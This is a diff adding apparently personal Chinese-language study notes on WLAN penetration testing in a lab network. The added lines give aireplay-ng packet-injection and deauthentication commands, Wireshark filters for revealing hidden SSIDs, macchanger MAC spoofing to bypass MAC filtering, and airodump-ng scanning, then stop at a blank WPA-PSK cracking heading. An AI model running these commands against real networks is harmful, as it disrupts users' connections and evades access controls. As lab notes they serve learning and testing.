@@ -109,6 +109,40 @@
         2.5.3. 启动wireshark，抓包接口wlan0mon
             sudo wireshark &
     2.6. 数据包注入
+        2.6.1. 启动wireshark
+            sudo wireshark &
+        2.6.2. 过滤环境中的非信标帧
+            (wlan.bssid == (AP mac地址)) && !(wlan.fc.type_subtype == 0x08)
+        2.6.3. 数据包注入 (我这边信道为6)
+            aireplay-ng -6 -e wirelesslab -a (AP mac地址) wlan0mon
+        2.6.4. 注意
+            kali linux无线网卡并未链接AP，便可以随意将数据包注入网络
+第三章、规避wlan验证
+    3.1. 发现隐藏的ssid (无线网络名称)
+        3.1.1. 打开wireshark
+            sudo wireshark &
+        3.1.2. 想所有主机发送接触验证数据包
+            sudo aireplay-ng -0 5 -a (AP mac地址) -- ignore-negative wlan0mon
+        3.1.3. 查看解除验证数据包
+            wlan.fc.type_subtype == 0x0c
+        3.1.4. 发现重连的探测请求过滤表达式
+            (wlan.bssid == (AP mac地址)) && !(wlan.fc.type_subtype == 0x08)
+    3.2. 欺骗mac过滤器
+        3.2.1. 发现连接无线客户端的mac地址
+            sudo airodump-ng -c 10 -a --bssid (AP mac地址) wlan0mon
+        3.2.2. mac地址冒充
+            ifconfig wlan0mon down
+            sudo macchanger -m (AP mac地址) wlan0mon
+            ifconfig wlan0mon up
+第四章、wlan加密漏洞
+    4.1. wlan加密
+        wep、wpa、wpa2
+    4.2. 查看附近wifi
+        sudo airodump-ng wlan0mon
+    4.3. 破解wpa-psk弱密码
+
+
+
                         </code>
                     </pre>
                 </figure>
